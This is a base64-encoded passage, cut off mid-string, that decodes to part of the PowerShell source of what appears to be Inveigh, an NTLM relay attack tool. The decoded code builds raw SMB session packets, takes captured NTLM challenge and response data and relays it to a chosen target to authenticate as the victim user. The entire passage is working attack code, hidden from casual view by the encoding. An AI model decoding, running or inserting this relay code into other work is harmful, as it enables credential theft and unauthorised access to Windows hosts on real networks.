LWd0IDEpCiAgICB7CiAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiUnVuIFRpbWUgPSAkUnVuVGltZSBNaW51dGVzIikgPiAkbnVsbAogICAgfQoKfQoKJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiU01CIFJlbGF5IEVuYWJsZWQiKSAgPiAkbnVsbAokaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJTTUIgUmVsYXkgVGFyZ2V0ID0gJFNNQlJlbGF5VGFyZ2V0IikgPiAkbnVsbAoKaWYoJFNNQlJlbGF5VXNlcm5hbWVzKQp7CgogICAgaWYoJFNNQlJlbGF5VXNlcm5hbWVzLkNvdW50IC1lcSAxKQogICAgewogICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIlNNQiBSZWxheSBVc2VybmFtZSA9ICIgKyAkU01CUmVsYXlVc2VybmFtZXMgLWpvaW4gIiwiKSA+ICRudWxsCiAgICB9CiAgICBlbHNlCiAgICB7CiAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiU01CIFJlbGF5IFVzZXJuYW1lcyA9ICIgKyAkU01CUmVsYXlVc2VybmFtZXMgLWpvaW4gIiwiKSA+ICRudWxsCiAgICB9Cgp9CgppZigkU01CUmVsYXlBdXRvRGlzYWJsZSAtZXEgJ1knKQp7CiAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJTTUIgUmVsYXkgQXV0byBEaXNhYmxlIEVuYWJsZWQiKSA+ICRudWxsCn0KZWxzZQp7CiAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJTTUIgUmVsYXkgQXV0byBEaXNhYmxlIERpc2FibGVkIikgPiAkbnVsbAp9CgppZigkU01CUmVsYXlOZXR3b3JrVGltZW91dCkKewogICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiU01CIFJlbGF5IE5ldHdvcmsgVGltZW91dCA9ICRTTUJSZWxheU5ldHdvcmtUaW1lb3V0IFNlY29uZHMiKSA+ICRudWxsCn0KCmlmKCRTaG93SGVscCAtZXEgJ1knKQp7CiAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJVc2UgR2V0LUNvbW1hbmQgLU5vdW4gSW52ZWlnaCogdG8gc2hvdyBhdmFpbGFibGUgZnVuY3Rpb25zIikgPiAkbnVsbAogICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiUnVuIFN0b3AtSW52ZWlnaCB0byBzdG9wIEludmVpZ2giKSA+ICRudWxsCiAgICAgICAgCiAgICBpZigkaW52ZWlnaC5jb25zb2xlX291dHB1dCkKICAgIHsKICAgICAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJQcmVzcyBhbnkga2V5IHRvIHN0b3AgcmVhbCB0aW1lIGNvbnNvbGUgb3V0cHV0IikgPiAkbnVsbAogICAgfQoKfQoKaWYoJGludmVpZ2guc3RhdHVzX291dHB1dCkKewoKICAgIHdoaWxlKCRpbnZlaWdoLnN0YXR1c19xdWV1ZS5Db3VudCAtZ3QgMCkKICAgIHsKCiAgICAgICAgaWYoJGludmVpZ2gub3V0cHV0X3N0cmVhbV9vbmx5KQogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtT3V0cHV0KCRpbnZlaWdoLnN0YXR1c19xdWV1ZVswXSArICRpbnZlaWdoLm5ld2xpbmUpCiAgICAgICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5SZW1vdmVSYW5nZSgwLDEpCiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CgogICAgICAgICAgICBzd2l0Y2ggKCRpbnZlaWdoLnN0YXR1c19xdWV1ZVswXSkKICAgICAgICAgICAgewoKICAgICAgICAgICAgICAgICJSdW4gU3RvcC1JbnZlaWdoIHRvIHN0b3AgSW52ZWlnaCIKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nKCRpbnZlaWdoLnN0YXR1c19xdWV1ZVswXSkKICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuUmVtb3ZlUmFuZ2UoMCwxKQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGRlZmF1bHQKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1PdXRwdXQoJGludmVpZ2guc3RhdHVzX3F1ZXVlWzBdKQogICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5SZW1vdmVSYW5nZSgwLDEpCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICB9CgogICAgICAgIH0KCiAgICB9Cgp9CgokcHJvY2Vzc19JRCA9IFtTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2Vzc106OkdldEN1cnJlbnRQcm9jZXNzKCkgfCBTZWxlY3QtT2JqZWN0IC1leHBhbmQgaWQKJHByb2Nlc3NfSUQgPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJHByb2Nlc3NfSUQpKQokcHJvY2Vzc19JRCA9ICRwcm9jZXNzX0lEIC1yZXBsYWNlICItMDAtMDAiLCIiCltCeXRlW11dICRpbnZlaWdoLnByb2Nlc3NfSURfYnl0ZXMgPSAkcHJvY2Vzc19JRC5TcGxpdCgiLSIpIHwgRm9yRWFjaC1PYmplY3R7W0NoYXJdW1N5c3RlbS5Db252ZXJ0XTo6VG9JbnQxNigkXywxNil9CgojIEJlZ2luIFNjcmlwdEJsb2NrcwoKIyBTaGFyZWQgQmFzaWMgZnVuY3Rpb25zIFNjcmlwdEJsb2NrCiRzaGFyZWRfYmFzaWNfZnVuY3Rpb25zX3NjcmlwdGJsb2NrID0KewogICAgZnVuY3Rpb24gRGF0YVRvVUludDE2KCRmaWVsZCkKICAgIHsKCSAgIFtBcnJheV06OlJldmVyc2UoJGZpZWxkKQoJICAgcmV0dXJuIFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9VSW50MTYoJGZpZWxkLDApCiAgICB9CgogICAgZnVuY3Rpb24gRGF0YVRvVUludDMyKCRmaWVsZCkKICAgIHsKCSAgIFtBcnJheV06OlJldmVyc2UoJGZpZWxkKQoJICAgcmV0dXJuIFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9VSW50MzIoJGZpZWxkLDApCiAgICB9CgogICAgZnVuY3Rpb24gRGF0YUxlbmd0aAogICAgewogICAgICAgIHBhcmFtIChbSW50XSRsZW5ndGhfc3RhcnQsW0J5dGVbXV0kc3RyaW5nX2V4dHJhY3RfZGF0YSkKCiAgICAgICAgJHN0cmluZ19sZW5ndGggPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvSW50MTYoJHN0cmluZ19leHRyYWN0X2RhdGFbJGxlbmd0aF9zdGFydC4uKCRsZW5ndGhfc3RhcnQgKyAxKV0sMCkKICAgICAgICByZXR1cm4gJHN0cmluZ19sZW5ndGgKICAgIH0KCiAgICBmdW5jdGlvbiBEYXRhVG9TdHJpbmcKICAgIHsKICAgICAgICBwYXJhbSAoW0ludF0kc3RyaW5nX2xlbmd0aCxbSW50XSRzdHJpbmcyX2xlbmd0aCxbSW50XSRzdHJpbmczX2xlbmd0aCxbSW50XSRzdHJpbmdfc3RhcnQsW0J5dGVbXV0kc3RyaW5nX2V4dHJhY3RfZGF0YSkKCiAgICAgICAgJHN0cmluZ19kYXRhID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkc3RyaW5nX2V4dHJhY3RfZGF0YVsoJHN0cmluZ19zdGFydCskc3RyaW5nMl9sZW5ndGgrJHN0cmluZzNfbGVuZ3RoKS4uKCRzdHJpbmdfc3RhcnQrJHN0cmluZ19sZW5ndGgrJHN0cmluZzJfbGVuZ3RoKyRzdHJpbmczX2xlbmd0aCAtIDEpXSkKICAgICAgICAkc3RyaW5nX2RhdGEgPSAkc3RyaW5nX2RhdGEgLXJlcGxhY2UgIi0wMCIsIiIKICAgICAgICAkc3RyaW5nX2RhdGEgPSAkc3RyaW5nX2RhdGEuU3BsaXQoIi0iKSB8IEZvckVhY2gtT2JqZWN0e1tDaGFyXVtTeXN0ZW0uQ29udmVydF06OlRvSW50MTYoJF8sMTYpfQogICAgICAgICRzdHJpbmdfZXh0cmFjdCA9IE5ldy1PYmplY3QgU3lzdGVtLlN0cmluZyAoJHN0cmluZ19kYXRhLDAsJHN0cmluZ19kYXRhLkxlbmd0aCkKCiAgICAgICAgcmV0dXJuICRzdHJpbmdfZXh0cmFjdAogICAgfQp9CgojIFNNQiBOVExNIGZ1bmN0aW9ucyBTY3JpcHRCbG9jayAtIGZ1bmN0aW9uIGZvciBwYXJzaW5nIE5UTE0gY2hhbGxlbmdlL3Jlc3BvbnNlCiRTTUJfTlRMTV9mdW5jdGlvbnNfc2NyaXB0YmxvY2sgPQp7CiAgICBmdW5jdGlvbiBTTUJOVExNQ2hhbGxlbmdlCiAgICB7CiAgICAgICAgcGFyYW0gKFtCeXRlW11dJHBheWxvYWRfYnl0ZXMpCgogICAgICAgICRwYXlsb2FkID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkcGF5bG9hZF9ieXRlcykKICAgICAgICAkcGF5bG9hZCA9ICRwYXlsb2FkIC1yZXBsYWNlICItIiwiIgogICAgICAgICROVExNX2luZGV4ID0gJHBheWxvYWQuSW5kZXhPZigiNEU1NDRDNEQ1MzUzNTAwMCIpCgogICAgICAgIGlmKCRwYXlsb2FkLlN1YlN0cmluZygoJE5UTE1faW5kZXggKyAxNiksOCkgLWVxICIwMjAwMDAwMCIpCiAgICAgICAgewogICAgICAgICAgICAkTlRMTV9jaGFsbGVuZ2UgPSAkcGF5bG9hZC5TdWJTdHJpbmcoKCROVExNX2luZGV4ICsgNDgpLDE2KQogICAgICAgIH0KCiAgICAgICAgcmV0dXJuICROVExNX2NoYWxsZW5nZQogICAgfQoKfQoKIyBTTUIgUmVsYXkgQ2hhbGxlbmdlIFNjcmlwdEJsb2NrIC0gZ2F0aGVycyBOVExNIHNlcnZlciBjaGFsbGVuZ2UgZnJvbSByZWxheSB0YXJnZXQKJFNNQl9yZWxheV9jaGFsbGVuZ2Vfc2NyaXB0YmxvY2sgPQp7CiAgICBmdW5jdGlvbiBTTUJSZWxheUNoYWxsZW5nZQogICAgewogICAgICAgIHBhcmFtICgkU01CX3JlbGF5X3NvY2tldCwkSFRUUF9yZXF1ZXN0X2J5dGVzKQoKICAgICAgICBpZiAoJFNNQl9yZWxheV9zb2NrZXQpCiAgICAgICAgewogICAgICAgICAgICAkU01CX3JlbGF5X2NoYWxsZW5nZV9zdHJlYW0gPSAkU01CX3JlbGF5X3NvY2tldC5HZXRTdHJlYW0oKQogICAgICAgIH0KICAgICAgICAKICAgICAgICAkU01CX3JlbGF5X2NoYWxsZW5nZV9ieXRlcyA9IE5ldy1PYmplY3QgU3lzdGVtLkJ5dGVbXSAxMDI0CiAgICAgICAgJGkgPSAwCiAgICAgICAgCiAgICAgICAgOlNNQl9yZWxheV9jaGFsbGVuZ2VfbG9vcCB3aGlsZSAoJGkgLWx0IDIpCiAgICAgICAgewogICAgICAgIAogICAgICAgICAgICBzd2l0Y2ggKCRpKQogICAgICAgICAgICB7CgogICAgICAgICAgICAgICAgMAogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfY2hhbGxlbmdlX3NlbmQgPSAweDAwLDB4MDAsMHgwMCwweDJmLDB4ZmYsMHg1MywweDRkLDB4NDIsMHg3MiwweDAwLDB4MDAsMHgwMCwweDAwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDE4LDB4MDEsMHg0OCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAsMHhmZiwweGZmICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gucHJvY2Vzc19JRF9ieXRlcyArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDBjLDB4MDAsMHgwMiwweDRlLDB4NTQsMHgyMCwweDRjLDB4NGQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MjAsMHgzMCwweDJlLDB4MzEsMHgzMiwweDAwCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIDEKICAgICAgICAgICAgICAgIHsgCiAgICAgICAgICAgICAgICAgICAgJFNNQl9sZW5ndGhfMSA9ICcweHswOlgyfScgLWYgKCRIVFRQX3JlcXVlc3RfYnl0ZXMuTGVuZ3RoICsgMzIpCiAgICAgICAgICAgICAgICAgICAgJFNNQl9sZW5ndGhfMiA9ICcweHswOlgyfScgLWYgKCRIVFRQX3JlcXVlc3RfYnl0ZXMuTGVuZ3RoICsgMjIpCiAgICAgICAgICAgICAgICAgICAgJFNNQl9sZW5ndGhfMyA9ICcweHswOlgyfScgLWYgKCRIVFRQX3JlcXVlc3RfYnl0ZXMuTGVuZ3RoICsgMikKICAgICAgICAgICAgICAgICAgICAkU01CX05UTE1TU1BfbGVuZ3RoID0gJzB4ezA6WDJ9JyAtZiAoJEhUVFBfcmVxdWVzdF9ieXRlcy5MZW5ndGgpCiAgICAgICAgICAgICAgICAgICAgJFNNQl9ibG9iX2xlbmd0aCA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkSFRUUF9yZXF1ZXN0X2J5dGVzLkxlbmd0aCArIDM0KSkKICAgICAgICAgICAgICAgICAgICAkU01CX2Jsb2JfbGVuZ3RoID0gJFNNQl9ibG9iX2xlbmd0aCAtcmVwbGFjZSAiLTAwLTAwIiwiIgogICAgICAgICAgICAgICAgICAgICRTTUJfYmxvYl9sZW5ndGggPSAkU01CX2Jsb2JfbGVuZ3RoLlNwbGl0KCItIikgfCBGb3JFYWNoLU9iamVjdHtbQ2hhcl1bU3lzdGVtLkNvbnZlcnRdOjpUb0ludDE2KCRfLDE2KX0KICAgICAgICAgICAgICAgICAgICAkU01CX2J5dGVfY291bnQgPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJEhUVFBfcmVxdWVzdF9ieXRlcy5MZW5ndGggKyA0NSkpCiAgICAgICAgICAgICAgICAgICAgJFNNQl9ieXRlX2NvdW50ID0gJFNNQl9ieXRlX2NvdW50IC1yZXBsYWNlICItMDAtMDAiLCIiCiAgICAgICAgICAgICAgICAgICAgJFNNQl9ieXRlX2NvdW50ID0gJFNNQl9ieXRlX2NvdW50LlNwbGl0KCItIikgfCBGb3JFYWNoLU9iamVjdHtbQ2hhcl1bU3lzdGVtLkNvbnZlcnRdOjpUb0ludDE2KCRfLDE2KX0KICAgICAgICAgICAgICAgICAgICAkU01CX25ldGJpb3NfbGVuZ3RoID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZyhbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRIVFRQX3JlcXVlc3RfYnl0ZXMuTGVuZ3RoICsgMTA0KSkKICAgICAgICAgICAgICAgICAgICAkU01CX25ldGJpb3NfbGVuZ3RoID0gJFNNQl9uZXRiaW9zX2xlbmd0aCAtcmVwbGFjZSAiLTAwLTAwIiwiIgogICAgICAgICAgICAgICAgICAgICRTTUJfbmV0Ymlvc19sZW5ndGggPSAkU01CX25ldGJpb3NfbGVuZ3RoLlNwbGl0KCItIikgfCBGb3JFYWNoLU9iamVjdHtbQ2hhcl1bU3lzdGVtLkNvbnZlcnRdOjpUb0ludDE2KCRfLDE2KX0KICAgICAgICAgICAgICAgICAgICBbQXJyYXldOjpSZXZlcnNlKCRTTUJfbmV0Ymlvc19sZW5ndGgpCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV9jaGFsbGVuZ2Vfc2VuZCA9IDB4MDAsMHgwMCArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfbmV0Ymlvc19sZW5ndGggKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweGZmLDB4NTMsMHg0ZCwweDQyLDB4NzMsMHgwMCwweDAwLDB4MDAsMHgwMCwweDE4LDB4MDEsMHg0OCwweDAwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHhmZiwweGZmICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gucHJvY2Vzc19JRF9ieXRlcyArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwYywweGZmLDB4MDAsMHgwMCwweDAwLDB4ZmYsMHhmZiwweDAyLDB4MDAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDEsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9ibG9iX2xlbmd0aCArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDAsMHg0NCwweDAwLDB4MDAsMHg4MCArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfYnl0ZV9jb3VudCArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4NjAgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2xlbmd0aF8xICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwNiwweDA2LDB4MmIsMHgwNiwweDAxLDB4MDUsMHgwNSwweDAyLDB4YTAgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2xlbmd0aF8yICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgzMCwweDNjLDB4YTAsMHgwZSwweDMwLDB4MGMsMHgwNiwweDBhLDB4MmIsMHgwNiwweDAxLDB4MDQsMHgwMSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg4MiwweDM3LDB4MDIsMHgwMiwweDBhLDB4YTIgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2xlbmd0aF8zICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwNCArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfTlRMTVNTUF9sZW5ndGggKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSFRUUF9yZXF1ZXN0X2J5dGVzICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg1NSwweDZlLDB4NjksMHg3OCwweDAwLDB4NTMsMHg2MSwweDZkLDB4NjIsMHg2MSwweDAwCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICB9CgogICAgICAgICAgICAkU01CX3JlbGF5X2NoYWxsZW5nZV9zdHJlYW0uV3JpdGUoJFNNQl9yZWxheV9jaGFsbGVuZ2Vfc2VuZCwwLCRTTUJfcmVsYXlfY2hhbGxlbmdlX3NlbmQuTGVuZ3RoKQogICAgICAgICAgICAkU01CX3JlbGF5X2NoYWxsZW5nZV9zdHJlYW0uRmx1c2goKQogICAgICAgICAgICAKICAgICAgICAgICAgaWYoJFNNQlJlbGF5TmV0d29ya1RpbWVvdXQpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfY2hhbGxlbmdlX3RpbWVvdXQgPSBuZXctdGltZXNwYW4gLVNlY29uZHMgJFNNQlJlbGF5TmV0d29ya1RpbWVvdXQKICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfY2hhbGxlbmdlX3N0b3B3YXRjaCA9IFtTeXN0ZW0uRGlhZ25vc3RpY3MuU3RvcHdhdGNoXTo6U3RhcnROZXcoKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB3aGlsZSghJFNNQl9yZWxheV9jaGFsbGVuZ2Vfc3RyZWFtLkRhdGFBdmFpbGFibGUpCiAgICAgICAgICAgICAgICB7CgogICAgICAgICAgICAgICAgICAgIGlmKCRTTUJfcmVsYXlfY2hhbGxlbmdlX3N0b3B3YXRjaC5FbGFwc2VkIC1nZSAkU01CX3JlbGF5X2NoYWxsZW5nZV90aW1lb3V0KQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5BZGQoIlNNQiByZWxheSB0YXJnZXQgZGlkbid0IHJlc3BvbmQgd2l0aGluICRTTUJSZWxheU5ldHdvcmtUaW1lb3V0IHNlY29uZHMiKQogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2cuQWRkKCRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlWyRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBTTUIgcmVsYXkgdGFyZ2V0IGRpZG4ndCByZXNwb25kIHdpdGhpbiAkU01CUmVsYXlOZXR3b3JrVGltZW91dCBzZWNvbmRzIildKQogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5TTUJfcmVsYXlfYWN0aXZlX3N0ZXAgPSAwCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfc29ja2V0LkNsb3NlKCkKICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsgU01CX3JlbGF5X2NoYWxsZW5nZV9sb29wCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICB9CiAgICAKICAgICAgICAgICAgJFNNQl9yZWxheV9jaGFsbGVuZ2Vfc3RyZWFtLlJlYWQoJFNNQl9yZWxheV9jaGFsbGVuZ2VfYnl0ZXMsMCwkU01CX3JlbGF5X2NoYWxsZW5nZV9ieXRlcy5MZW5ndGgpCiAgICAgICAgICAgICRpKysKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgcmV0dXJuICRTTUJfcmVsYXlfY2hhbGxlbmdlX2J5dGVzCiAgICB9Cgp9CgojIFNNQiBSZWxheSBSZXNwb25zZSBTY3JpcHRCbG9jayAtIHNlbmRzIE5UTE0gcmVwb25zZSB0byByZWxheSB0YXJnZXQKJFNNQl9yZWxheV9yZXNwb25zZV9zY3JpcHRibG9jayA9CnsKICAgIGZ1bmN0aW9uIFNNQlJlbGF5UmVzcG9uc2UKICAgIHsKICAgICAgICBwYXJhbSAoJFNNQl9yZWxheV9zb2NrZXQsJEhUVFBfcmVxdWVzdF9ieXRlcywkU01CX3VzZXJfSUQpCiAgICAKICAgICAgICAkU01CX3JlbGF5X3Jlc3BvbnNlX2J5dGVzID0gTmV3LU9iamVjdCBTeXN0ZW0uQnl0ZVtdIDEwMjQKCiAgICAgICAgaWYgKCRTTUJfcmVsYXlfc29ja2V0KQogICAgICAgIHsKICAgICAgICAgICAgJFNNQl9yZWxheV9yZXNwb25zZV9zdHJlYW0gPSAkU01CX3JlbGF5X3NvY2tldC5HZXRTdHJlYW0oKQogICAgICAgIH0KCiAgICAgICAgJFNNQl9sZW5ndGhfMSA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkSFRUUF9yZXF1ZXN0X2J5dGVzLkxlbmd0aCArIDEyKSkKICAgICAgICAkU01CX2xlbmd0aF8xID0gJFNNQl9sZW5ndGhfMSAtcmVwbGFjZSAiLTAwLTAwIiwiIgogICAgICAgICRTTUJfbGVuZ3RoXzEgPSAkU01CX2xlbmd0aF8xLlNwbGl0KCItIikgfCBGb3JFYWNoLU9iamVjdHtbQ2hhcl1bU3lzdGVtLkNvbnZlcnRdOjpUb0ludDE2KCRfLDE2KX0KICAgICAgICAkU01CX2xlbmd0aF8yID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZyhbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRIVFRQX3JlcXVlc3RfYnl0ZXMuTGVuZ3RoICsgOCkpCiAgICAgICAgJFNNQl9sZW5ndGhfMiA9ICRTTUJfbGVuZ3RoXzIgLXJlcGxhY2UgIi0wMC0wMCIsIiIKICAgICAgICAkU01CX2xlbmd0aF8yID0gJFNNQl9sZW5ndGhfMi5TcGxpdCgiLSIpIHwgRm9yRWFjaC1PYmplY3R7W0NoYXJdW1N5c3RlbS5Db252ZXJ0XTo6VG9JbnQxNigkXywxNil9CiAgICAgICAgJFNNQl9sZW5ndGhfMyA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkSFRUUF9yZXF1ZXN0X2J5dGVzLkxlbmd0aCArIDQpKQogICAgICAgICRTTUJfbGVuZ3RoXzMgPSAkU01CX2xlbmd0aF8zIC1yZXBsYWNlICItMDAtMDAiLCIiCiAgICAgICAgJFNNQl9sZW5ndGhfMyA9ICRTTUJfbGVuZ3RoXzMuU3BsaXQoIi0iKSB8IEZvckVhY2gtT2JqZWN0e1tDaGFyXVtTeXN0ZW0uQ29udmVydF06OlRvSW50MTYoJF8sMTYpfQogICAgICAgICRTTUJfTlRMTVNTUF9sZW5ndGggPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJEhUVFBfcmVxdWVzdF9ieXRlcy5MZW5ndGgpKQogICAgICAgICRTTUJfTlRMTVNTUF9sZW5ndGggPSAkU01CX05UTE1TU1BfbGVuZ3RoIC1yZXBsYWNlICItMDAtMDAiLCIiCiAgICAgICAgJFNNQl9OVExNU1NQX2xlbmd0aCA9ICRTTUJfTlRMTVNTUF9sZW5ndGguU3BsaXQoIi0iKSB8IEZvckVhY2gtT2JqZWN0e1tDaGFyXVtTeXN0ZW0uQ29udmVydF06OlRvSW50MTYoJF8sMTYpfQogICAgICAgICRTTUJfYmxvYl9sZW5ndGggPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJEhUVFBfcmVxdWVzdF9ieXRlcy5MZW5ndGggKyAxNikpCiAgICAgICAgJFNNQl9ibG9iX2xlbmd0aCA9ICRTTUJfYmxvYl9sZW5ndGggLXJlcGxhY2UgIi0wMC0wMCIsIiIKICAgICAgICAkU01CX2Jsb2JfbGVuZ3RoID0gJFNNQl9ibG9iX2xlbmd0aC5TcGxpdCgiLSIpIHwgRm9yRWFjaC1PYmplY3R7W0NoYXJdW1N5c3RlbS5Db252ZXJ0XTo6VG9JbnQxNigkXywxNil9CiAgICAgICAgJFNNQl9ieXRlX2NvdW50ID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZyhbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRIVFRQX3JlcXVlc3RfYnl0ZXMuTGVuZ3RoICsgMjcpKQogICAgICAgICRTTUJfYnl0ZV9jb3VudCA9ICRTTUJfYnl0ZV9jb3VudCAtcmVwbGFjZSAiLTAwLTAwIiwiIgogICAgICAgICRTTUJfYnl0ZV9jb3VudCA9ICRTTUJfYnl0ZV9jb3VudC5TcGxpdCgiLSIpIHwgRm9yRWFjaC1PYmplY3R7W0NoYXJdW1N5c3RlbS5Db252ZXJ0XTo6VG9JbnQxNigkXywxNil9CiAgICAgICAgJFNNQl9uZXRiaW9zX2xlbmd0aCA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkSFRUUF9yZXF1ZXN0X2J5dGVzLkxlbmd0aCArIDg2KSkKICAgICAgICAkU01CX25ldGJpb3NfbGVuZ3RoID0gJFNNQl9uZXRiaW9zX2xlbmd0aCAtcmVwbGFjZSAiLTAwLTAwIiwiIgogICAgICAgICRTTUJfbmV0Ymlvc19sZW5ndGggPSAkU01CX25ldGJpb3NfbGV